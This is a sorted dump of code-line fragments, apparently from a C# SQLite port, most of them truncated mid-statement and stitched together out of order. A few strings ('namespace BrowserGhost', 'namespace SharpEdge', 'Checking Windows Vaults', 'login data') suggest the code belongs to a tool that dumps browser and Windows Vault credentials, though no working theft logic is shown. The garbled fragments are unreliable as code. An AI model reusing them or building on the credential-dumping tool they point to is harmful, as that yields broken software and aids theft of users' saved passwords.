if !SQLITE_OMIT_FOREIGN_KEY
if !SQLITE_OMIT_GET_TABLE
if !SQLITE_OMIT_GLOBALRECOVER
if !SQLITE_OMIT_INCRBLOB
if !SQLITE_OMIT_INCRBLOB 
if !SQLITE_OMIT_INTEGRITY_CHECK
if !SQLITE_OMIT_LOAD_EXTENSION
if !SQLITE_OMIT_LOCALTIME
if !SQLITE_OMIT_LOOKASIDE
if !SQLITE_OMIT_MEMORYDB
if !SQLITE_OMIT_OR_OPTIMIZATION
if !SQLITE_OMIT_PAGER_PRAGMAS
if !SQLITE_OMIT_PRAGMA
if !SQLITE_OMIT_PROGRESS_CALLBACK
if !SQLITE_OMIT_QUICKBALANCE
if !SQLITE_OMIT_REINDEX
if !SQLITE_OMIT_SCHEMA_PRAGMAS
if !SQLITE_OMIT_SCHEMA_VERSION_PRAGMAS
if !SQLITE_OMIT_SHARED_CACHE
if !SQLITE_OMIT_SUBQUERY
if !SQLITE_OMIT_SUBQUERY 
if !SQLITE_OMIT_TCL_VARIABLE
if !SQLITE_OMIT_TEMPDB
if !SQLITE_OMIT_TRACE
if !SQLITE_OMIT_TRACE 
if !SQLITE_OMIT_TRIGGER
if !SQLITE_OMIT_TRIGGER 
if !SQLITE_OMIT_TRUNCATE_OPTIMIZATION
if !SQLITE_OMIT_UTF16
if !SQLITE_OMIT_VACUUM
if !SQLITE_OMIT_VACUUM 
if !SQLITE_OMIT_VIEW
if !SQLITE_OMIT_VIEW 
if !SQLITE_OMIT_VIRTUALTABLE
if !SQLITE_OMIT_WSD
if !SQLITE_OMIT_XFER_OPT
if !SQLITE_OS_WINCE
if !SQLITE_OS_WINCE 
if !SQLITE_PRINT_BUF_SIZE
if !SQLITE_SECURE_DELETE
if !SQLITE_TEMP_FILE_PREFIX
if !SQLITE_TEMP_STORE
if !SQLITE_TEST
if !SQLITE_THREADSAFE
if !SQLITE_THREADSAFE 
if !YYNOERRORRECOVERY
if !YYSTACKDEPTH
if !YYSTACKDEPTH//was YYSTACKDEPTH>0
if !_BTREE_H_
if !_FILE_OFFSET_BITS
if !_GNU_SOURCE
if !_HWTIME_H_
if !_OS_COMMON_H_
if !_PAGER_H_
if !_PCACHE_H_
if !_SQLITE3EXT_H_
if !_SQLITEINT_H_
if !_SQLITE_HASH_H_
if !_SQLITE_OS_H_
if !_SQLITE_VDBE_H_
if !_VDBEINT_H_
if !_XOPEN_SOURCE 
if !defined(SQLITE_ASCII) 
if !offsetof
if !putVarint32
if !statements.
if !u3216_TYPE
if !u328_TYPE
if !u32_TYPE
if !yytestcase
if (
if (  sqlite3GlobalConfig.bCoreMutex   )
if (  sqlite3GlobalConfig.mutex.xMutexAlloc != null )
if ( ! sqlite3GlobalConfig.bCoreMutex   )
if ( !sqlite3WhereTrace ) return
if ( ( count 
if ( ( pLevel.plan.wsFlags 
if ( ( pMem.flags 
if ( ( prereqExpr 
if ( ( rc 
if ( 0 == ( a 
if ( 0 == ( b 
if ( ALWAYS( pTabList.a[i].pTab ) 
if ( IsVirtual( pSrc.pTab ) )
if ( IsVirtual( pTab ) )
if ( SQLite3IoTrace == false ) return
if ( aUsage[j].omit )
if ( aUsage[k].argvIndex == j )
if ( db.mallocFailed != 0 ) return 0
if ( encnames[iEnc].zName == null )
if ( iReg == 0 )
if ( isMatchOfColumn( pExpr ) )
if ( k == nConstraint ) break
if ( nByte <= 0 )
if ( nFarg >= 2 
if ( nOp < 1 ) return
if ( p != null )
if ( p.iDb == iDb 
if ( pCur.eState==CURSOR_INVALID ){
if ( pLimit == null )
if ( pMod != null ) cp.pMod =pMod.Copy()
if ( pOp.opcode == OP_Trace 
if ( pParse.aTableLock != null )
if ( pParse.iCacheLevel != 0 )
if ( pParse.nAliasAlloc < pParse.nAlias )
if ( pParse.nested == 0 )
if ( pVTab !=null)
if ( pVtab != null ) cp.pVtab =pVtab.Copy()
if ( proxy_file_path!=0 )
if ( res != SQLITE_OK )
if ( sizeof( DWORD ) <= nBuf - n )
if ( sizeof( long ) <= nBuf - n )
if ( sqlite3_initialize() != 0 ) return null
if ( wsdAutoext.nExt == 0 )
if ( zRight[0]!=0 )
if (!pFile.hMutex) return TRUE
if (!pFile.hMutex){
if (!pFile.shared){
if (!pTstAlloc) return SQLITE_IOERR_NOMEM
if ((__GNUC__) 
if (GetLastError() == ERROR_ALREADY_EXISTS){
if (SQLITE_DEBUG) 
if (SQLITE_EBCDIC)
if (SQLITE_ENABLE_OVERSIZE_CELL_CHECK)
if (SQLITE_ENABLE_UPDATE_DELETE_LIMIT) 
if (SQLITE_MUTEX_NOOP) 
if (SQLITE_SMALL_STACK)
if (SQLITE_TEST)
if (SQLITE_TEST) 
if (__GNUC__)
if (__GNUC__) 
if (bInit) {
if (dwFileOffsetLow == SHARED_FIRST
if (dwFileOffsetLow >= SHARED_FIRST 
if (false)
if (lpOverlapped.Offset == SHARED_FIRST 
if (pFile.hMutex){
if (pFile.hShared == NULL){
if (pFile.hShared){
if (pFile.local.bExclusive){
if (pFile.local.bPending){
if (pFile.local.bReserved) {
if (pFile.local.bReserved){
if (pFile.local.nReaders == 0)
if (pFile.local.nReaders == 1){
if (pFile.local.nReaders){
if (pFile.shared.bExclusive == 0){
if (pFile.shared.bPending == 0) {
if (pFile.shared.bReserved == 0) {
if (pFile.shared.nReaders == 0 
if DEBUG
if DEBUG 
if DEBUG_CLASS
if DEBUG_CLASS_EXPR 
if DEBUG_CLASS_MEM 
if DEBUG_CLASS_TOKEN 
if DEBUG_CLASS_VDBEOP 
if FALSE
if FALSE   // 
if FALSE  //
if FALSE //'A' == '
if HAVE_GMTIME_R
if HAVE_INTTYPES_H
if HAVE_STDINT_H
if MEMORY_DEBUG
if NDEBUG
if SQLITE_32BIT_ROWID
if SQLITE_AMALGAMATION
if SQLITE_ASCII
if SQLITE_CASE_SENSITIVE_LIKE
if SQLITE_CHECK_PAGES
if SQLITE_CHECK_PAGES 
if SQLITE_CHECK_PAGES  
if SQLITE_COVERAGE_TEST
if SQLITE_DEBUG
if SQLITE_DEBUG 
if SQLITE_DEFAULT_PAGE_SIZE //SQLITE_DEFAULT_PAGE_SIZE>SQLITE_MAX_PAGE_SIZE
if SQLITE_EBCDIC
if SQLITE_ENABLE_ATOMIC_WRITE
if SQLITE_ENABLE_CEROD
if SQLITE_ENABLE_COLUMN_METADATA
if SQLITE_ENABLE_EXPENSIVE_ASSERT
if SQLITE_ENABLE_ICU
if SQLITE_ENABLE_IOTRACE
if SQLITE_ENABLE_LOCKING_STYLE
if SQLITE_ENABLE_MEMORY_MANAGEMENT
if SQLITE_ENABLE_MEMSYS3
if SQLITE_ENABLE_MEMSYS3 
if SQLITE_ENABLE_MEMSYS5
if SQLITE_ENABLE_RTREE
if SQLITE_ENABLE_UNLOCK_NOTIFY
if SQLITE_HAS_CODEC
if SQLITE_HAS_CODEC 
if SQLITE_HAVE_ISNAN
if SQLITE_MALLOC_SOFT_LIMIT
if SQLITE_MAX_ATTACHED<0 
if SQLITE_MAX_COLUMN
if SQLITE_MAX_COLUMN 
if SQLITE_MAX_COLUMN>32767
if SQLITE_MAX_COMPOUND_SELECT<2
if SQLITE_MAX_DEFAULT_PAGE_SIZE //SQLITE_MAX_DEFAULT_PAGE_SIZE>SQLITE_MAX_PAGE_SIZE
if SQLITE_MAX_EXPR_DEPTH //>0
if SQLITE_MAX_EXPR_DEPTH//>0
if SQLITE_MAX_FUNCTION_ARG<0 
if SQLITE_MAX_LENGTH<100
if SQLITE_MAX_LIKE_PATTERN_LENGTH<1
if SQLITE_MAX_SQL_LENGTH<100
if SQLITE_MAX_SQL_LENGTH>SQLITE_MAX_LENGTH
if SQLITE_MAX_VARIABLE_NUMBER<1
if SQLITE_MAX_VDBE_OP<40
if SQLITE_MUTEX_OMIT
if SQLITE_MUTEX_W32
if SQLITE_NO_SYNC
if SQLITE_OMIT_AUTHORIZATION
if SQLITE_OMIT_AUTOVACUUM
if SQLITE_OMIT_COMPLETE
if SQLITE_OMIT_DECLTYPE 
if SQLITE_OMIT_FLOATING_POINT
if SQLITE_OMIT_GET_TABLE
if SQLITE_OMIT_INCRBLOB
if SQLITE_OMIT_LOAD_EXTENSION
if SQLITE_OMIT_MEMORYDB
if SQLITE_OMIT_PROGRESS_CALLBACK
if SQLITE_OMIT_SHARED_CACHE
if SQLITE_OMIT_TEMPDB
if SQLITE_OMIT_TRACE
if SQLITE_OMIT_TRIGGER
if SQLITE_OMIT_UTF16
if SQLITE_OMIT_VIEW
if SQLITE_OMIT_VIRTUALTABLE
if SQLITE_OMIT_WSD
if SQLITE_OS_WIN
if SQLITE_OS_WIN 
if SQLITE_OS_WIN               // 
if SQLITE_OS_WINCE
if SQLITE_PERFORMANCE_TRACE
if SQLITE_SECURE_DELETE
if SQLITE_SOUNDEX
if SQLITE_SSE
if SQLITE_SYSTEM_MALLOC
if SQLITE_TCL 
if SQLITE_TEMP_STORE<1 
if SQLITE_TEMP_STORE==1
if SQLITE_TEMP_STORE==2
if SQLITE_TEMP_STORE==3
if SQLITE_TEST
if SQLITE_TEST 
if SQLITE_TEST  //
if SQLITE_THREADSAFE
if SQLITE_THREADSAFE 
if SQLITE_USE_ALLOCA
if SQLITE_ZERO_MALLOC
if SQL_DEBUG
if THREADSAFE
if TRACE
if TRACE 
if TRANSLATE_TRACE 
if TRUE
if VDBE_PROFILE
if VDBE_PROFILE 
if YYERRORSYMBOL
if YYFALLBACK
if YYSTACKDEPTH//<=0
if YYTRACKMAXSTACKDEPTH
if YYWILDCARD
if _HAVE_SQLITE_CONFIG_H
if _MSC_VER
if __CYGWIN__
if __FAST_MATH__
if __cplusplus
if defined(SQLITE_DEBUG) 
if defined(SQLITE_OS_OTHER)
if defined(SQLITE_SYSTEM_MALLOC)
if defined(_WIN32_WCE)
if defined(__BORLANDC__)
if defined(__GNUC__)
if getVarint32
if i386 
if( 
if(  sqlite3GlobalConfig.pHeap==0 ){
if( !db ){
if( !isPrepareV2 ) return
if( !isVirtual 
if( !p->locked ){
if( !p->sharable ) return
if( !p.aConstraint[i].usable 
if( !p.sharable ){
if( !pCsr.wrFlag ){
if( !pLock ){
if( !pOrderBy ){
if( !pPager.tempFile ){
if( !res ){
if( !sqlite3SafetyCheckOk(db) ){
if( !sqlite3SafetyCheckSickOrOk(db) ){
if( !sqlite3_mutex_held(db->mutex) ){
if( !zCollSeq ){
if( !zFullPathname ){
if( !zMaster 
if( (!aDyn 
if( (!pPage 
if( (O=(char
if( (SQLITE_BIG_DBL/((double)2))<pIdxInfo.estimatedCost ){
if( (flags 
if( (i
if( (pBtree.sharable==null)
if( (pLevel.plan.wsFlags 
if( (pSib = db.aDb[i].pBt)!=null 
if( (rc
if( (wrflag 
if( (zLeft[3] 
if( 0==(dc
if( 0==db.mallocFailed 
if( 0==db.mallocFailed ){
if( 0==pPage.leaf ){
if( ALWAYS(nOvfl) 
if( ALWAYS(pList) ){
if( ALWAYS(pModule.xUpdate) ){
if( ALWAYS(pStack) ){
if( GLOBAL(BtShared
if( IsVirtual(pTab) ){
if( IsVirtual(pTabItem.pTab) ){
if( NEVER(pTab==0) ) return
if( NEVER(zAuthArg==0) ){
if( OMIT_TEMPDB ==0
if( P->xCodec 
if( P->xCodec==0 ){ O=(char
if( SQLITE_OK!=rc ){
if( SQLITE_OK==rc 
if( SQLITE_OK==rc ){
if( SQLITE_THREADSAFE 
if( SQLITE_THREADSAFE ){
if( SQLITE_UTF16NATIVE==SQLITE_UTF16BE ){
if( aXRef[i]>=0 ){
if( argv!=null ){
if( argv[i]==null ){
if( auth!=SQLITE_OK ){
if( auth==SQLITE_DENY ){
if( azNew==null ) goto malloc_failed
if( azResult !=null){
if( b01[0]==0xFE 
if( b01[0]==0xFF 
if( bom!=0 ){
if( cbrk<iCellFirst 
if( code!=prevcode ){
if( code>0 ){
if( db ){
if( db->init.busy 
if( db->mallocFailed ){
if( db->nDb>2 
if( db->pBlockingConnection==0 
if( db->xAuth==0 ) return
if( db->xAuth==0 ){
if( db.lookaside.bEnabled 
if( db.lookaside.nOut>db.lookaside.mxOut ){
if( db.mallocFailed !=0{
if( db.nextPagesize ){
if( db.xCollNeeded16!=null ){
if( desiredEnc==SQLITE_UTF8 ){
if( eLock==WRITE_LOCK ){
if( eLock>pLock.eLock ){
if( enc==SQLITE_UTF16 ){
if( encoding!=SQLITE_UTF8 ){
if( i<0 
if( i==pOrderBy.nExpr ){
if( i>=0xD800 
if( iCol==pTab.nCol ){
if( iCol>=0 ){
if( iDb<0 ){
if( iDb==1 ) code = SQLITE_DROP_TEMP_TRIGGER
if( iDc
if( iTabDb==1 
if( idx==BTREE_LARGEST_ROOT_PAGE 
if( info.iOverflow ){
if( isIndex ){
if( isMemdb==null 
if( isTemp ){
if( isView ){
if( isWriteLock 
if( mutexIsNT() 
if( n>nMaxArgs ) nMaxArgs = n
if( nArg!=0 ){
if( nBuf>0 ){
if( nKey ) db.nextPagesize = 0
if( new_size
if( new_size==pH->htsize ) return false
if( null==p.pReal 
if( null==p.pReal ){
if( null==p.zBuf ){
if( null==pTab 
if( osType==0 ){
if( out ){
if( p 
if( p ){
if( p->locked ) return
if( p->pBlockingConnection==0 
if( p->pBlockingConnection==db ){
if( p->pReal ){
if( p->pUnlockConnection==db ){
if( p->sharable ){
if( p->wantToLock==0 ){
if( p->wantToLock==0){
if( p->xUnlockNotify!=xUnlockNotify 
if( p.iSize<(iOfst
if( p.iSize>0 ){
if( p.isIncrblobHandle 
if( p.nData 
if( p.nOp==0 ) return dummy
if( p.nRow==0 
if( p.nRow==0 ){
if( p.needToFreeIdxStr !=0){
if( p.pBt<pSib.pBt ){
if( p.pEList 
if( p.pMethods!=
if( p.pNext ) p.pNext.pPrev = p.pPrev
if( p.pNext ){
if( p.pPrev ) p.pPrev.pNext = p.pNext
if( p.pReal ){
if( p.pgnoRoot==iRoot
if( p.sharable ){
if( p2->xUnlockNotify==p->xUnlockNotify ) seen = 1
if( pArray->aBtree[i]->pBt>pBt ){
if( pAuthArg ){
if( pAutoinc ) pAutoinc = autoinc
if( pBlock ){
if( pBt.mutex==null ){
if( pBt.nRef<=0 ){
if( pBt.pWriter!=p 
if( pBt.pWriter==p ){
if( pBtree==0 
if( pCol ){
if( pContext->pParse ){
if( pCsr.eState!=CURSOR_VALID ){
if( pCur ){
if( pCur.aOverflow 
if( pCur.aOverflow ){
if( pCur.isIncrblobHandle 
if( pCur.nullRow ){
if( pCx.pVtabCursor ){
if( pDef ){
if( pEList == null ) goto limit_where_cleanup_2
if( pExisting 
if( pExpr->iColumn>=0 ){
if( pExpr.op!=TK_COLUMN 
if( pExpr.op!=TK_FUNCTION ){
if( pFile.zDeleteOnClose ){
if( pIdx.tnum==(int)iRoot ){
if( pIdxInfo->orderByConsumed ){
if( pIdxInfo.needToFreeIdxStr ){
if( pIdxInfo==0 ){
if( pIdxInfo==null ){
if( pInClause == null ) goto limit_where_cleanup_1
if( pIter.iTable==iTable 
if( pIter.pBtree!=p 
if( pIter.pBtree!=p ){
if( pLater->locked ){
if( pLater->wantToLock ){
if( pList.a[1].pExpr.op != TK_COLUMN ){
if( pList.nExpr!=2 ){
if( pLock.iTable!=1 ){
if( pLock.pBtree==p ){
if( pLock.pBtree==pBtree
if( pMem->n>1 ){
if( pMem.enc!=SQLITE_UTF8 
if( pMem.flags 
if( pMem.z 
if( pMod.xDestroy ){
if( pNew ){
if( pNotNull ) pNotNull = notnull
if( pOp->p4type==P4_DYNAMIC ){
if( pOp.opcode==OP_VOpen 
if( pOrderBy ){
if( pOrderBy!=null 
if( pOrderBy.nExpr>db.aLimit[SQLITE_LIMIT_COLUMN] ){
if( pPager->xCodecFree ) pPager->xCodecFree(pPager->pCodec)
if( pPager->xCodecSizeChng ){
if( pPrimaryKey ) pPrimaryKey = primarykey
if( pRowid ){
if( pSelect == null ) return null
if( pSelectRowid == null ) goto limit_where_cleanup_2
if( pSelectSrc == null ) {
if( pTabList ){
if( pTerm.eOperator 
if( pTerm.leftCursor != pSrc.iCursor ) continue
if( pVTab !=null){
if( pVdbe.magic==VDBE_MAGIC_RUN 
if( pWhereRowid == null ) goto limit_where_cleanup_1
if( pc<iCellFirst 
if( pcache1.pStart==0 ){
if( pnoCase ) return 0
if( pzCollSeq ) pzCollSeq = zCollSeq
if( pzDataType ) pzDataType = zDataType
if( pzErrMsg !=null ){
if( rc !=0) return rc
if( rc !=0){
if( rc!=SQLITE_OK ){
if( rc==SQLITE_DENY ){
if( rc==SQLITE_IGNORE ){
if( rc==SQLITE_NOMEM ){
if( rc==SQLITE_OK 
if( rc==SQLITE_OK ){
if( rc==SQLITE_TOOBIG ) goto too_big
if( res ){
if( res.azResult==null ){
if( res.nAlloc>res.nData ){
if( sCheck.anRef[i]==null ){
if( sContext.isError ){
if( sqlite3GlobalConfig.mutex.xMutexEnd ){
if( sqlite3GlobalConfig.sharedCacheEnabled ){
if( sqlite3IsRowid(zColumnName) ){
if( sqlite3SafetyOff(db) ) goto abort_due_to_misuse
if( sqlite3SafetyOn(db) ) goto abort_due_to_misuse
if( sqlite3SafetyOn(db) ){
if( sqlite3VdbeMemTooBig(pDest) ){
if( sqlite3_mutex_try(p->pBt->mutex)==SQLITE_OK ){
if( stateno>YY_REDUCE_MAX ){
if( winMutex_isInit==1 ){
if( wrflag ){
if( xNotify==0 ){
if( yyTraceFILE ){
if( yymx==YYERRORSYMBOL 
if( yypParser.yyerrcnt<0 ){
if( yypParser.yyidx < 0 
if( yypParser.yyidx>=yypParser.yystksz ){
if( yypParser.yyidx>yypParser.yyidxMax ){
if( yypParser.yystksz <=0 ){
if( yysize!=0 ){
if( z==0 ){
if( z==null ) goto malloc_failed
if( zFilename8 ){
if( zIn==0 ) zIn = (u8
if( zIn[i] ){
if( zRight 
if( zSql8 ){
if(rc!=SQLITE_OK ){
ifdef SQLITE_INT64_TYPE
ifdef SQLITE_OMIT_FLOATING_POINT
ifdef SQLITE_OMIT_INCRBLOB
ifdef SQLITE_TEXT
ifdef SQLITE_VERSION
ifdef SQLITE_VERSION_NUMBER
ifdef __cplusplus
ifndef NDEBUG
ifndef SQLITE_API
ifndef SQLITE_EXTERN
ifndef _SQLITE3_H_
in){
include <assert.h>
include <inttypes.h>
include <stdarg.h>
include <stdarg.h>     /
include <stddef.h>
include <stdint.h>
include <stdio.h>
include <stdlib.h>
include <string.h>
include <time.h>
include <winbase.h>
include below.
include of specific headers which differs between
include the sqliteInt.h file and let that file
include this file instead of
include this header file directly.
include-ed by sqliteInt.h and thus ends up
included by the os_
included into those
includes this file so that it is available
initone_error_out:
insert_cleanup:
insert_end:
int (
int DIRECT_MODE = isDirectMode
int addr
int autoinc = 0
int balance_deeper_called = 0
int balance_quick_called = 0
int bom = 0
int c
int cnt
int cnt = 0
int code
int code = SQLITE_CREATE_TRIGGER
int code = SQLITE_DROP_INDEX
int code = SQLITE_DROP_TRIGGER
int code = iCode[zIn[i]
int dc
int eLockType          /
int ephemTab
int flags
int i
int i = 
int iCol
int iCur = pTabItem.iCursor
int iDb
int iDc = sqlite3OsDeviceCharacteristics(pPager.fd)
int iDummy = 0
int iOffset
int iQuery
int iReg
int iSize
int iSrc
int iTerm = aConstraint[j].iTermOffset
int iTerm = aConstraint[k].iTermOffset
int id
int idxNew
int ii
int isClearTable        /
int isTemp = 0
int len
int n
int n = 0
int n = sqlite3Strlen30(argv[i])
int nArg
int nArg = 0
int nBuf
int nBuf                   /
int nByte
int nBytes
int nConstraint = pVtabIdx.nConstraint
int nFree = 0
int nFullPathname = pVfs.mxPathname
int nKey
int nOp = p.nOp
int nOrderBy
int nOvfl = (pCur.info.nPayload-pCur.info.nLocal
int nReaders
int nRef
int nRef=0
int nRet = 0
int nSector
int nTerm
int need
int newSize
int notnull = 0
int origPc
int p1 = p.iDb
int p1 = pOp.p1
int primarykey = 0
int proxy_file_path = 0
int rc
int rc = SQLITE_BUSY
int rc = SQLITE_NOMEM
int rc = SQLITE_OK
int rc=0
int res
int seen = 0
int sqlite3AuthCheck(
int sqlite3AuthCheck(Parse
int sqlite3BtreeHoldsAllMutexes(sqlite3
int sqlite3BtreeHoldsAllMutexes(sqlite3 
int sqlite3BtreeHoldsMutex(Btree
int sqlite3BtreeHoldsMutex(Btree 
int sqlite3JournalCreate(sqlite3_file p){
int sqlite3JournalOpen(
int sqlite3JournalSize(sqlite3_vfs pVfs){
int sqlite3ParserStackPeak(void
int sqlite3ParserStackPeak(void p){
int sqlite3PcacheReleaseMemory(int nReq){
int sqlite3Utf16ByteLen(const void 
int sqlite3VdbeReleaseBuffers(Vdbe 
int sqlite3VtabBegin(sqlite3 
int sqlite3VtabCallConnect(Parse 
int sqlite3VtabCallCreate(sqlite3 
int sqlite3VtabCallDestroy(sqlite3 
int sqlite3VtabCommit(sqlite3 
int sqlite3VtabRollback(sqlite3 
int sqlite3VtabSync(sqlite3 
int sqlite3_complete16(const void 
int sqlite3_create_module(
int sqlite3_create_module_v2(
int sqlite3_declare_vtab(sqlite3 
int sqlite3_enable_shared_cache(int enable){
int sqlite3_open16(
int sqlite3_set_authorizer(
int sqlite3_table_column_metadata(
int sqlite3_unlock_notify(
int szPage
int t = sqlite3_value_type(argv[2])
int timeout = ( (sqlite3)ptr ).busyTimeout
int yyerrorhit = 0
int yyidxMax
int yymx
interruptx)(sqlite3
invalidateOverflowCache(p)
isTemp = 1
isView = false
j = pIdxCons.iTermOffset
json
lTm)
last_insert_rowid)(sqlite3
leaveMutex()
len = pMem.n 
libversion)(void)
libversion_number)(void)
likeInfoAlt == (char
likeInfoAlt)[1] == (char
likeInfoAlt)[2] == (char
likeInfoAlt.matchAll)
likeInfoAlt.matchOne)
likeInfoAlt.matchSet)
limit)(sqlite3
limit_where_cleanup_1:
limit_where_cleanup_2:
line <lineno> <grammarfile>
line <lineno> <thisfile>
localtime_r(
localtime_s(
lockBtreeMutex(p)
lockBtreeMutex(pLater)
login data
long i
lookupname_end:
malloc)(int)
mallocProc)( (size_t)yyParser.Length )
mallocProc)(size_t)){
malloc_failed:
maskSrc ) 
mbcsToUnicode(string zFilename){
mem1 )
memory)
memory_highwater)(int)
memory_used)(void)
memset(
mftb    %L0
mftbu   %0
might
mprintf)(const char
multi_select_end:
mutex = sqlite3MutexAlloc(SQLITE_MUTEX_STATIC_MASTER)
mutexOpen = sqlite3MutexAlloc(SQLITE_MUTEX_STATIC_OPEN)
mutexShared
mutexShared = sqlite3MutexAlloc(SQLITE_MUTEX_STATIC_MASTER)
mutex_alloc)(int)
mutex_enter)(sqlite3_mutex
mutex_free)(sqlite3_mutex
mutex_leave)(sqlite3_mutex
mutex_try)(sqlite3_mutex
n - 1]) 
n = (int)(z-zBuf)
n = pOp[-1].p1
n into temp table
n' )
n' ) { zIdx
n)>p->nByte ){
n=== Checking Windows Vaults ===
nArg = (int)pArgc.u.i
nArg = 0
nArg = pOp.p2
nByte
nByte )
nByte = (u32)( pMem.n 
nByte = 1
nBytes = ( pParse.nTableLock 
nCol
nCol are initialized to 0.  The others
nCol)
nCol]:        Number of distinct values in column N
nCol]:   Last observed value of column N
nDel)<=nType
nDel]
nExtra)
nField
nFree 
nKey )
nKey = sqlite3_value_bytes(argv[2])
nMasterJournal )
nName
nNew)
nNumberOfBytesToLockLow == 1){
nNumberOfBytesToLockLow == SHARED_SIZE){
nOld
nOrderBy
nOrderBy )
nOrderBy = 0
nOrderBy = pIdxInfo.nOrderBy
nOrderBy = pOrderBy.nExpr
nOvfl)
nQPlan < sizeof(sqlite3_query_plan)-10 )
nQPlan < sizeof(sqlite3_query_plan)-2 )
nQPlan < sizeof(sqlite3_query_plan)-2 )//if( n
nReg-1
nReg-1.
nReg-1. Keep the column cache up-to-date.
nRet 
nRetry ) < 2 ) ) 
nSavepoint
nSector = pPager.sectorSize
nSkip is always valid).
nStr-i
nTerm
nVtabLock = 0
nVtabLock = SaveBuf[nested].nVtabLock
name
namespace BrowserGhost
namespace CS_SQLite3
namespace SharpEdge
nbsp
need = (int)nCol
newSize = p.yystksz
new_size = SQLITE_MALLOC_SOFT_LIMIT/sizeof(struct _ht)
nextPage = pCur.aOverflow[iIdx
nextPage = pCur.aOverflow[iIdx]
next_stmt)(sqlite3
nnn wildcard that the parser will accept.
no_mem:
noopMutexAlloc(int id){ return (sqlite3_mutex
noopMutexNotheld
notnull = pCol->notNull!=0
null
offset 
offset = (offset%ovflSize)
op_column_out:
open)(const char
open16)(const void
open_v2)(const char
opendb_out:
origPc = pc
osType = sInfo.dwPlatformId==VER_PLATFORM_WIN32_NT 
overload_function)(sqlite3
ovflSize-1)/ovflSize
p = 
p = '
p = (Incrblob 
p = (JournalFile 
p = db->aDb[i].pBt
p = db->pDisconnect
p = null
p = p->pNext
p = pArray->aBtree[i]
p = pParse.aTableLock[i]
p = pParse.aTableLock[pParse.nTableLock
p = pVTab->pVtab
p = sqlite3MallocZero( sizeof(
p == '
p) )
p)) 
p)) )
p)))/sizeof(struct RowSetEntry))
p){ return
p){ return 1
p){ return SQLITE_OK
p->aMem[p->nMem] )
p->aMem[pOp->p1]
p->aMem[pOp->p4.i]
p->aMutex)
p->cnt
p->cnt--
p->locked = 0
p->locked = 1
p->pBlockingConnection = 0
p->pBt->db = p->db
p->pNextBlocked
p->pNextBlocked = 0
p->pUnlockArg = 0
p->pUnlockConnection = 0
p->wantToLock
p->wantToLock--
p->xUnlockNotify = 0
p->z[p->n] - pArg->z)
p.aConstraintUsage[i].omit )
p.aConstraint[i].usable )
p.aMem[ii]
p.aMem[pOp.p1]
p.aMem[pOp.p3]
p.aOp[i].cnt = 0
p.aOp[i].cnt>0 
p.aOp[i].cycles = 0
p.aOrderBy[i].desc )
p.azResult = azNew
p.azResult[p.nData
p.eState = CURSOR_INVALID
p.flags = flags
p.iDb = iDb
p.iSize = (iOfst
p.iSize = size
p.iTab = iTab
p.id = iType
p.inVtabMethod = 0
p.inVtabMethod = 1
p.inVtabMethod = 2
p.isWriteLock = (byte)( ( p.isWriteLock != 0 
p.isWriteLock = isWriteLock
p.lock
p.lock )
p.lock.eLock = READ_LOCK
p.lock.iTable = 1
p.lock.pBtree = p
p.lock.pNext = pBt.pLock
p.mask
p.nAlloc )
p.nAlloc = p.nAlloc
p.nBuf = nBuf
p.nChange
p.nColumn = (int)nCol
p.nRef
p.nRef--
p.nRow
p.name)
p.owner = GetCurrentThreadId()
p.pBt = pBt
p.pBt.db = p.db
p.pMethod = 
p.pNext = pSib
p.pNext = pSib.pNext
p.pNext.pPrev = p
p.pPrev = 0
p.pPrev = pSib
p.pReal = pReal
p.pVfs = pVfs
p.rc = SQLITE_ERROR
p.rc = SQLITE_NOMEM
p.sharable = 1
p.yystksz = newSize
p.zBuf = sqlite3MallocZero(nBuf)
p.zErrMsg = pVTab.pVtab.zErrMsg
p.zErrMsg = pVtab.zErrMsg
p.zErrMsg = sqlite3_mprintf(
p.zJournal = zName
p.zName = zName
p=null
pAccum))
pAndInfo))
pAppData
pArg
pArg = 
pArg = 0
pArg)
pArgc
pArgc = 
pArray){
pArray->aBtree[i] = pBtree
pArray->aBtree[j] = pArray->aBtree[j-1]
pArray->aBtree[pArray->nMutex
pArray->nMutex
pAutoinc               /
pAux                      /
pBest)
pBest))
pBest[1]
pBlob){
pBlock = pIter.pBtree.db
pBlocker){
pBlockingConnection
pBt = pBtree->pBt
pBt.isExclusive = (u8)(wrflag>1)
pBt.isExclusive = 0
pBt.isPending = 0
pBt.isPending = 1
pBt.mutex = sqlite3MutexAlloc(SQLITE_MUTEX_FAST)
pBt.nRef
pBt.nRef = 1
pBt.nRef--
pBt.pLock
pBt.pLock = 
pBt.pLock = pLock
pBt.pNext = GLOBAL(BtShared
pBt.pWriter = 0
pBt.pWriter = p
pBtree){
pCell[9]
pCell[info.iOverflow]
pCell[nHeader]
pCell[pPage.childPtrSize]
pClientData          /
pCodec
pCol = pTab.aCol[iCol]
pColl) 
pContext){
pContext->pParse = 0
pContext->pParse = pParse
pContext->pParse->zAuthContext = pContext->zAuthContext
pContext->zAuthContext = pParse->zAuthContext
pCost))
pCost.plan.nEq = 0
pCost.plan.u.pVtabIdx = pIdxInfo
pCost.plan.wsFlags 
pCost.plan.wsFlags = WHERE_VIRTUALTABLE
pCost.rCost = (SQLITE_BIG_DBL/((double)2))
pCost.rCost = pIdxInfo.estimatedCost
pCur
pCur = 0
pCur = p.apCsr[pOp.p1]
pCur){
pCur.aOverflow = (Pgno 
pCur.aOverflow = null
pCur.aOverflow[iIdx] = nextPage
pCur.aiIdx[pCur.iPage]
pCur.info)
pCur.isIncrblobHandle = 1
pCur.nullRow = 0
pCur.pModule = pVtabCursor.pVtab.pModule
pCur.pVtabCursor = pVtabCursor
pCurrent and
pCurrent and 
pCurrent parameter is undefined.</dd>
pCurrent.
pData)
pData0[pOp->p2 - 1]
pDbSize is set to the size of the
pDef
pDef.zName)
pDel
pDest = p.aMem[pOp.p3]
pEnd){
pExists is
pExists is set to 0 and SQLITE_OK
pExists is set to 1 and
pExists is undefined.
pExpr     /
pExpr))
pExpr->op = TK_NULL
pExpr.affinity = SQLITE_AFF_INTEGER
pExpr.iColumn = -1
pExpr.iTable = pItem.iCursor
pExpr.op = TK_COLUMN
pExpr.op = TK_NULL
pExpr.pTab = pItem.pTab
pFKey) 
pFile))
pFile->lastErrno = (u32)GetLastError()
pFile. Return SQLITE_OK on success
pFile.hMutex = NULL
pFile.hShared = NULL
pFile.local.bExclusive = FALSE
pFile.local.bExclusive = TRUE
pFile.local.bPending = FALSE
pFile.local.bPending = TRUE
pFile.local.bReserved = FALSE
pFile.local.bReserved = TRUE
pFile.local.nReaders 
pFile.local.nReaders --
pFile.shared = (winceLock
pFile.shared.bExclusive = FALSE
pFile.shared.bExclusive = TRUE
